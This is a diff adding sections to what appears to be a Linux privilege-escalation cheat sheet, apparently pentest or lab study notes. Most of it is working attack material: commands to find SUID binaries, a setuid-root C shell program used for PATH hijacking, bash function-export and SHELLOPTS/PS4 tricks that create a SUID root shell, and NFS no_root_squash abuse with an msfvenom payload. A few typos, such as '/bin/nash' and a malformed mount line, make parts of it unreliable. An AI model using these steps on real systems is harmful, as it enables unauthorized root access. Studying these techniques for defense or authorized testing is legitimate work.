@@ -246,13 +246,64 @@ void inject()
 gcc -shared -fPIC -o libcalc.so libcalc.c
 
 /usr/local/bin/suid.so 
+```
+Finding Vulnerable programs
 
-------
+```
+strings /path/to/file
+strace -v -f -e execve <command> 2>&1 | grep exec 
+ltrace <command>
+```
+Suid
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
+vim service.c
 
+[service.c]
+int main(){
+  setuid(0);
+  system("/bin/bash -p");
+}
+----
 
+gcc -o service service.c 
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+Abusing Shell Features ( BASH < 4.1.5 << )
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+```
+Shellin with ENV ( BASH < 4.1.5 << )
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/nash /tmp/rootbash;  chmod +s /tmp/rootbash)' /usr/local/bin/suid-env
 
+/tmp/rootbash 
+```
+NFS
+```
+/etc/exports (Check file shares config)
 
+showmount -e <target>
+nmap -sV -script=nfs-showmount <target>
+mount -o rw,vers=2 <target>:<share> <local_directory>
+
+Disable root sqash
+no_root_squash (can write normally if enmabled)
+
+[KALI, but make sure you are root@kali, as have to take the privs with you]
+showmount -e <target>
+mkdir /tmp/nfs
+mount -o rw,vers=2 <target>/tmp /tmp/nfs
+
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+[TARGET]
+ls -l /tmp (check if file is owned by root)
+./shell.elf
 ```
 A list of tools
 ```
